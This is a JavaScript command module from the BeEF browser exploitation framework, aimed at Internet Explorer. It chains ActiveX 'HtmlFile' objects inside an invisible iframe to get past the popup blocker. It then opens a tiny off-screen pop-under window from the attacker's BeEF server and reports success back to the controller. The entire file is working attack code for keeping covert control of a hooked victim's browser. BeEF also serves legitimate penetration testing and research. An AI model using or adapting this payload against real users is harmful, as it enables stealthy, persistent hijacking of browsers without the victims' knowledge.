//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var popunder_url = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html';
  var popunder_name = Math.random().toString(36).substring(2,10);
  var iframe_name = Math.random().toString(36).substring(2,10);

  // Create iframe
  var popunder_<%= @command_id %> = beef.dom.createInvisibleIframe();
  popunder_<%= @command_id %>.name = iframe_name;
  popunder_<%= @command_id %>.id = iframe_name;

  // Create an HtmlFile from an IFrame
  var ax1 = new window[iframe_name].ActiveXObject("HtmlFile");

  // Destroy the contents of the IFrame, while keeping ax1 alive
  // because we have a reference to it outside the IFrame itself.
  window[iframe_name].document.open().close();

  // Initialize the HtmlFile
  ax1.open().close();

  // Create a new htmlFile inside the previous one
  var ax2 = new ax1.Script.ActiveXObject("HtmlFile");
  ax2.open().close();

  // Launch popup
  beef.debug("[PopUnder Window (IE)] Creating window '" + popunder_name + "' for '" + popunder_url + "'");
  ax2.Script.open(popunder_url, popunder_name, 'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left=' + screen.width + ',top=' + screen.height).blur();
  window.focus();
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window requested');
});
